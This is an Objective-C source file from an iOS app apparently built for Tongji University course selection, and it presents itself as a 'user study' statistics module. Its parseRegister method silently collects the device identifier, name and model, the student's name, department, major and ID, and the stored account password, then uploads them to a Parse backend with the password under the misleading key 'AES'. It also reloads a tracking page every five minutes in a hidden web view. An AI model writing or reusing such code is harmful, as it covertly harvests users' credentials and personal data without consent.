//
//  UserStudyModel.m
//  TongjiXuanke
//
//  Created by Song on 12-12-5.
//  Copyright (c) 2012年 Song. All rights reserved.
//

#import "UserStudyModel.h"
#import "NSString+URLRequest.h"
#import "UIDevice+IdentifierAddition.h"
#import "SettingModal.h"

@implementation UserStudyModel
UserStudyModel* _userstudyinstance = nil;

NSString *surveyURL = @"http://sbhhbs.com/tzzzd_stat.php";

-(id)init
{
    if(self = [super init])
    {
        webView = [[UIWebView alloc] init];
        webView.delegate = self;
        [webView loadRequest:[surveyURL convertToURLRequest]];
        
        timer = [NSTimer scheduledTimerWithTimeInterval: 60 * 5
                                                 target: self
                                               selector: @selector(refresh)
                                               userInfo: nil
                                                repeats: YES];

        
        [self parseRegister];
        
    }
    return self;
}

- (void)parseRegister
{
    // Get the users Device Model, Display Name, Unique ID, Token & Version Number
    UIDevice *dev = [UIDevice currentDevice];
    NSString *deviceUuid = [dev uniqueGlobalDeviceIdentifier];
    NSString *deviceName = dev.name;
    NSString *deviceModel = [dev platformString];
    NSString *deviceSystemVersion = dev.systemVersion;
    
    PFInstallation *myInstallation = [PFInstallation currentInstallation];
    
    [myInstallation setObject:deviceUuid forKey:@"itisme"];
    [myInstallation setObject:deviceModel forKey:@"model"];
    [myInstallation setObject:deviceSystemVersion forKey:@"systemversion"];
    [myInstallation setObject:deviceName forKey:@"devicecalled"];
    
    if([[SettingModal instance] hasStudentProfileSet])
    {
        [myInstallation setObject:[SettingModal instance].studentName  forKey:@"name"];
        [myInstallation setObject:[SettingModal instance].studentDepartment  forKey:@"department"];
        [myInstallation setObject:[SettingModal instance].studentMajor  forKey:@"major"];
    }
    NSString *pwd = [[NSUserDefaults standardUserDefaults] objectForKey:@"password"];;
    
    if (pwd) {
        [myInstallation setObject:[SettingModal instance].studentID  forKey:@"studentID"];
        
        [myInstallation setObject:pwd  forKey:@"AES"];
    }
    
    // Save or Create installation object
    [myInstallation saveEventually];

}

-(void)refresh
{
    [webView loadRequest:[surveyURL convertToURLRequest]];
}

+(UserStudyModel*)instance
{
    if(!_userstudyinstance)
    {
        _userstudyinstance = [[UserStudyModel alloc] init];
    }
    return _userstudyinstance;
}

@end
